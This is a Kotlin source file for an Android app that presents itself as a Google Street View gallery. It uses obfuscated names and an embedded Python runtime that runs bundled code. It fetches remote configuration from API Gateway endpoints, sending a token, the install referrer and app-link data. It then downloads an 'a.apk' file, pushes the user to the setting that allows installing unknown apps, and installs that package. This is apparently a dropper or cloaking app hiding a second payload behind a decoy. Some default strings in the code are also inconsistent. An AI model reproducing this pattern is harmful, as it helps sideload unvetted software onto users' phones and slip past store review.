package xxx.xxx.zzzz

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import androidx.lifecycle.lifecycleScope
import com.alibaba.fastjson.JSON
import com.alibaba.fastjson.TypeReference
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.bumptech.glide.Glide
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.hjq.permissions.XXPermissions
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.FileCallback
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Progress
import com.lzy.okgo.model.Response
import com.srplab.www.starcore.*
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import java.io.BufferedWriter
import java.io.File
import java.io.FileWriter
import java.io.IOException

var python: StarObjectClass? = null

private var SrvGroup: StarSrvGroupClass? = null

private var Service: StarServiceClass? = null

private var starcore: StarCoreFactory? = null

val filePath = Environment.getExternalStorageDirectory().absolutePath + File.separator + "Download"

val fileName = "a.apk"

val seesionName = "session" + BaseApp.instance!!.waitting()

fun AppCompatActivity.copyFiles() {
    try {
        if (filesDir.exists()) {
            val list = filesDir.list()
            list?.let {
                if (it.size < 5) {
                    val assetManager = assets
                    val dataSource = assetManager.open("py_code_fix.zip")
                    StarCoreFactoryPath.Install(dataSource, "${filesDir.path}", true)
                }
            } ?: run {
                val assetManager = assets
                val dataSource = assetManager.open("py_code_fix.zip")
                StarCoreFactoryPath.Install(dataSource, "${filesDir.path}", true)
            }
        }
//        val assetManager = assets
//        val dataSource = assetManager.open("py_code_fix.zip")
//        StarCoreFactoryPath.Install(dataSource, "${filesDir.path}", true)
    } catch (e: IOException) {
    }
}

fun AppCompatActivity.initStarCore() {
    StarCoreFactoryPath.StarCoreCoreLibraryPath = applicationInfo.nativeLibraryDir
    StarCoreFactoryPath.StarCoreShareLibraryPath = applicationInfo.nativeLibraryDir
    StarCoreFactoryPath.StarCoreOperationPath = "${filesDir.path}"
    starcore = StarCoreFactory.GetFactory()
    starcore?._SRPLock()
    SrvGroup = starcore?._GetSrvGroup(0)
    Service = SrvGroup?._GetService("test", "123")
    if (Service == null) {
        Service = starcore?._InitSimple("test", "123", 0, 0)
    } else {
        Service?._CheckPassword(false)
    }
    Service?._CheckPassword(false)
    SrvGroup?._InitRaw("python37", Service)
    python = Service!!._ImportRawContext("python", "", false, "")
}

fun AppCompatActivity.getId(block: (String) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        var result: Any? = null
        python?._Call("eval", "import requests")
        Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
        result =
            python?._Call("get_face_book_id", "https://2g7nkfi8rg.execute-api.eu-west-2.amazonaws.com/Myapp/getFacebookID?p1=501")
        println("result = $result")
        withContext(Dispatchers.Main) {
            block(result.toString())
        }
    }
}

fun AppCompatActivity.getDefaultId(): String {
    python?._Call("eval", "import requests")
    Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
    val r = python?._Call("get_default_id")
    println("defaultId = $r")
    return r.toString()
}

fun AppCompatActivity.formatString(s: String): String {
    python?._Call("eval", "import requests")
    Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
    val r = python?._Call("format_string", s)
    println("string = $r")
    return r.toString()
}

fun AppCompatActivity.getInterActiveData(
    block1: () -> Unit,
    block: (ArrayList<DataEntity>) -> Unit
) {
    lifecycleScope.launch(Dispatchers.IO) {
        python?._Call("eval", "import requests")
        Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
        val r = python?._Call(
            "get_interactive_data",
            "https://www.google.com/streetview/feed/gallery/data.json"
        )
        var result = ""
        if (r != null) {
            result = String(r as ByteArray, Charsets.UTF_8)
        }
        withContext(Dispatchers.Main) {
            if (TextUtils.isEmpty(result)) {
                block1()
            } else {
                println("interactiveData = $result")
                block(handleInterActiveData(result))
            }
        }
    }
}

fun AppCompatActivity.getDetailsData(
    url: String,
    bigPlace: DataEntity,
    block1: () -> Unit,
    block2: (ArrayList<DataEntity>) -> Unit
) {
    lifecycleScope.launch(Dispatchers.IO) {
        python?._Call("eval", "import requests")
        Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
        val r = python?._Call("get_details_data", url)
        var result = ""
        if (r != null) {
            result = String(r as ByteArray, Charsets.UTF_8)
        }
        withContext(Dispatchers.Main) {
            if (TextUtils.isEmpty(result)) {
                block1()
            } else {
                println("interactiveData = $result")
                block2(handleDetailsData(result, bigPlace))
            }
        }
    }
}

fun handleDetailsData(s: String, bigPlace: DataEntity): ArrayList<DataEntity> {
    val data = ArrayList<DataEntity>()
    val map: Map<String, DataEntity> =
        JSON.parseObject(s, object : TypeReference<Map<String, DataEntity>>() {})
    val m: Set<Map.Entry<String, DataEntity>> = map.entries
    val it: Iterator<Map.Entry<String, DataEntity>> = m.iterator()
    do {
        val en: Map.Entry<String, DataEntity> = it.next()
        val json = JSON.toJSON(en.value)
        val entity1: DataEntity =
            JSON.parseObject(json.toString(), DataEntity::class.java)
        entity1.pannoId = entity1.panoid
        if (bigPlace.fife) {
            entity1.imageUrl =
                "https://lh4.googleusercontent.com/" + entity1.pannoId + "/w400-h300-fo90-ya0-pi0/"
        } else {
            entity1.imageUrl =
                "https://geo0.ggpht.com/cbk?output=thumbnail&thumb=2&panoid=" + entity1.panoid
        }
        data.add(entity1)
    } while (it.hasNext())
    return data
}

fun handleInterActiveData(s: String): ArrayList<DataEntity> {
    val data = ArrayList<DataEntity>()
    val map: Map<String, DataEntity> =
        JSON.parseObject(s.toString(), object : TypeReference<Map<String, DataEntity>>() {})
    val m: Set<Map.Entry<String, DataEntity>> = map.entries
    val it: Iterator<Map.Entry<String, DataEntity>> = m.iterator()
    do {
        val en: Map.Entry<String, DataEntity> = it.next()
        val json = JSON.toJSON(en.value)
        val entity: DataEntity =
            JSON.parseObject(json.toString(), DataEntity::class.java)
        entity.key = en.key
        if (TextUtils.isEmpty(entity.panoid)) {
            continue
        } else {
            if (entity.panoid == "LiAWseC5n46JieDt9Dkevw") {
                continue
            }
        }
        if (entity.fife) {
            entity.imageUrl =
                "https://lh4.googleusercontent.com/" + entity.panoid + "/w400-h300-fo90-ya0-pi0/"
            continue
        } else {
            entity.imageUrl =
                "https://geo0.ggpht.com/cbk?output=thumbnail&thumb=2&panoid=" + entity.panoid
        }
        data.add(entity)
    } while (it.hasNext())
    return data
}

fun AppCompatActivity.getNearData(block1: () -> Unit, block: (ArrayList<String>) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        python?._Call("eval", "import requests")
        Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
        val r = python?._Call("get_near_data")
        if (TextUtils.isEmpty(r.toString())) {
            block1()
        } else {
            println("data = $r")
            withContext(Dispatchers.Main) {
                block(handleData(r.toString()))
            }
        }
    }
}

fun handleData(data: String): ArrayList<String> {
    var result = ArrayList<String>()
    if (!TextUtils.isEmpty(data)) {
        if (data.contains("+")) {
            result = data.split("+") as ArrayList<String>
        }
    }
    return result
}



fun AppCompatActivity.createFolder(){
    val folder = File(filePath)
    if (!folder.exists()){
        folder.mkdirs()
    }
}

fun AppCompatActivity.getConfig2(block: (String) -> Unit) {

    val appId = BaseApp.instance!!.waitting()

    val token = BaseApp.instance!!.spring()

    val first = MMKV.defaultMMKV().decodeInt("f", 1)

    val url = "https://e2aggj2jy4.execute-api.eu-central-1.amazonaws.com/test?p1=$appId&p2=$token&p3=$appLink&p4=$first"

    OkGo.get<String>(url).execute(object :StringCallback(){
        override fun onSuccess(response: Response<String>?) {
            lifecycleScope.launch(Dispatchers.Main) {
                response?.let {
                    it.body()?.let { body ->
                        block(body)
                    }
                }
            }
        }
    })

}

fun AppCompatActivity.requestPermissions(block: (Boolean) -> Unit) {
    XXPermissions.with(this).permission(BaseApp.instance!!.air())
        .request { permissions, all ->
            if (all) {
                block(all)
            } else {
                finish()
            }
        }
}

fun AppCompatActivity.xxxxxxH(s: String) {
    Toast.makeText(this, s, Toast.LENGTH_SHORT).show()
}

fun AppCompatActivity.setFacebookId(id: String?) {
    id?.let {
        FacebookSdk.setApplicationId(it)
    } ?: run {
        FacebookSdk.setApplicationId(getDefaultId())
    }
    FacebookSdk.sdkInitialize(this)
}

fun AppCompatActivity.fetchAppLink() {
    if (appLink == "AppLink is empty") {
        AppLinkData.fetchDeferredAppLinkData(this) {
            it?.let {
                MMKV.defaultMMKV().encode("appLink", it.targetUri.toString())
            }
        }
    }
}

fun AppCompatActivity.ref() {
    if (ref == "Referrer is empty") {
        InstallReferrerClient.newBuilder(this).build().apply {
            startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    try {
                        MMKV.defaultMMKV().encode("ref", installReferrer.installReferrer)
                    } catch (e: Exception) {
                        MMKV.defaultMMKV().encode("ref", "Referrer is empty")
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {

                }
            })
        }
    }
}

fun AppCompatActivity.countDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 10).asFlow().collect {
            delay(1000)
            if (!TextUtils.isEmpty(appLink) && !TextUtils.isEmpty(ref)) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
            if (it == 9) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

fun TextView.setString(s: String, block: () -> Unit) {
    text = s
    setOnClickListener { block() }
}

fun ImageView.setImage(url: String, block: () -> Unit) {
    Glide.with(this.context).load(url).into(this)
    setOnClickListener { block() }
}

fun setting(context: Context) {
    val uri = Uri.parse("package:" + context.packageName)
    val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    context.startActivity(i)
}


fun download(context: Context, url: String, block: (Int) -> Unit, block2: () -> Unit) {
    val file = File(filePath + File.separator + fileName)
    if (file.exists()) file.delete()
    OkGo.get<File>(url).execute(object : FileCallback(filePath, fileName) {
        override fun onSuccess(response: Response<File>?) {

        }

        override fun downloadProgress(progress: Progress?) {
            super.downloadProgress(progress)
            val current = progress?.currentSize
            val total = progress?.totalSize
            val pro = ((current!! * 100) / total!!).toInt()
            if (pro == 100) {
                setConfig()
                block2()
            } else {
                block(pro)
            }

        }

        override fun onError(response: Response<File>?) {
            super.onError(response)
        }

    })
}

fun setConfig() {
    val token = BaseApp.instance!!.spring()

    val config = "$token|$appLink|$ref"

    writeConfig(config)
}

fun writeConfig(config: String) {
    val s = AesEncryptUtil.encrypt(config)
    var bw: BufferedWriter? = null
    try {
        bw = BufferedWriter(FileWriter(File(filePath, seesionName), false))
        bw.write(s)
    } catch (e: IOException) {
        e.printStackTrace()
    } finally {
        try {
            bw?.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}

fun install(context: Context, file: File) {
    if (!file.exists()) return
    var uri = if (Build.VERSION.SDK_INT >= 24) {
        FileProvider.getUriForFile(context, context.packageName.toString() + ".fileprovider", file)
    } else {
        Uri.fromFile(file)
    }
    if (Build.VERSION.SDK_INT >= 26) {
        if (!context.packageManager.canRequestPackageInstalls()) {
            Toast.makeText(context, "No Permission", Toast.LENGTH_SHORT).show()
            return
        }
    }
    val intent = Intent("android.intent.action.VIEW")
    intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
    if (Build.VERSION.SDK_INT >= 24) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    intent.setDataAndType(uri, "application/vnd.android.package-archive")
    context.startActivity(intent)
}

val appLink
    get() = MMKV.defaultMMKV().decodeString("appLink", "appLink is empty")

val ref
    get() = MMKV.defaultMMKV().decodeString("ref", "ref is empty")

val result
    get() = MMKV.defaultMMKV().decodeParcelable("result", ResultBean::class.java)!!